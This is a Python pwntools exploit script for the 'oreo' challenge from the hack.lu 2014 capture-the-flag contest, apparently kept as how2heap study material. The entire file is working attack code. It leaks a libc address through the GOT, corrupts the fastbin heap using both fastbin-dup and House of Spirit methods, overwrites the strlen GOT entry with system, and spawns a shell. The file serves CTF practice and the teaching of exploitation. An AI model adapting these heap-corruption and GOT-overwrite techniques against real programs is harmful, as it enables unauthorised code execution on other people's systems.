from pwn import *
elf = ELF('./oreo_35f118d90a7790bbd1eb6d4549993ef0')
"""
[*] '/home/ubuntu/how2heap/house_of_spirit/hack_lu_2014_OREO/oreo_35f118d90a7790bbd1eb6d4549993ef0'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
"""

# libc 2.23 based offset
GOT_fget = 0x804a23c
GOT_strlen = 0x804a250
OFFSET_fget_libc = 0x5e150
OFFSET_system_libc = 0x3ada0

ADDR_pOrderMsg = 0x0804A2A8
"""
.bss:0804A288 ; rifleData *gRifle
.bss:0804A28C                 align 20h
.bss:0804A2A0 cntOrderDone    dd ?            
.bss:0804A2A4 cntNewDone      dd ?           
.bss:0804A2A8 ; char *pOrderMsg
.bss:0804A2AC                 db 14h dup(?)
.bss:0804A2C0 ; char msg[128]
"""

r = process(['./oreo_35f118d90a7790bbd1eb6d4549993ef0'])

def add(name, desc):
    #r.recvuntil('Action:')
    r.sendline('1')
    #r.recvuntil('Rifle name:')
    r.sendline(name)
    #r.recvuntil('Rifle description:')
    r.sendline(desc)

def show():
    #r.recvuntil('Action: ')
    r.sendline('2')

def order():
    #r.recvuntil('Action: ')
    r.sendline('3')

def leaveMsg(msg):
    #r.recvuntil('Action: ')
    r.sendline('4')
    #r.recvuntil('with your order: ')
    r.sendline(msg)

def showstats():
    #r.recvuntil('Action: ')
    r.sendline('5')

def exploit_using_fastbin_dup_into_stack():
    #pause()

    #leak libc address
    add('A'*27 + p32(GOT_fget), 'B')
    show()
    r.recvuntil('Description: ')
    r.recvuntil('Description: ')
    libc = u32(r.recv(4)) - OFFSET_fget_libc
    system = libc + OFFSET_system_libc
    log.info("libc base addr : %x" % libc)
    log.info("system libc addr : %x" % system)

    for i in xrange(0x3c):		# 0x3d also works
        add("A"*27 + p32(0), "B")	# cntNewDone = 0x3d
    add("A", "B")			# cntNewDone = 0x3e
    order()				# (0x40) b -> a -> 0
    
    #from IPython import embed; embed()
    add("A"*27 + p32(0) + p32(0) + p32(0x41) + p32(ADDR_pOrderMsg-8), "B")	# cntNewDone = 0x3f
										# a -> (ADDR_pOrderMsg-8)
    #pause()
    add("A"*27 + p32(0), "B")							# cntNewDone = 0x40
										# (ADDR_pOrderMsg-8) 
    add("A", p32(GOT_strlen))		# *(ADDR_pOrderMsg-8) = GOT_strlen

    leaveMsg(p32(system) + ";sh\x00")
    r.interactive()

def exploit_using_house_of_spirit():
    pause()

    #leak libc address
    add('A'*27 + p32(GOT_fget), 'B')
    show()
    r.recvuntil('Description: ')
    r.recvuntil('Description: ')
    libc = u32(r.recv(4)) - OFFSET_fget_libc
    system = libc + OFFSET_system_libc
    log.info("libc base addr : %x" % libc)
    log.info("system libc addr : %x" % system)

    for i in xrange(0x3e):	
        add("A"*27 + p32(0), "B")		# cntNewDone = 0x3f
    add("A"*27 + p32(ADDR_pOrderMsg), "B")	# cntNewDone = 0x40
    """
    (ADDR_pOrderMsg = 0x0804A2A8)
    
    gdb-peda$ x/20wx 0x804a2a8-0x8
    0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000
    0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000(next)

    0x804a2e0:	0x00000000	0x00000000	0x00000000	0x00000000
                  (prev)	  (size)
    """
    leaveMsg(p32(0)*8 + p32(0) + p32(0x40))	# Set next chunk's size = 0x40
    order()					# (0x40) (ADDR_pOrderMsg-8) -> a  
    
    add("A", p32(GOT_strlen))			# *(ADDR_pOrderMsg-8) = GOT_strlen
    leaveMsg(p32(system) + ";sh\x00")
    r.interactive()

if __name__ == "__main__":
    #exploit_using_fastbin_dup_into_stack()
    exploit_using_house_of_spirit()




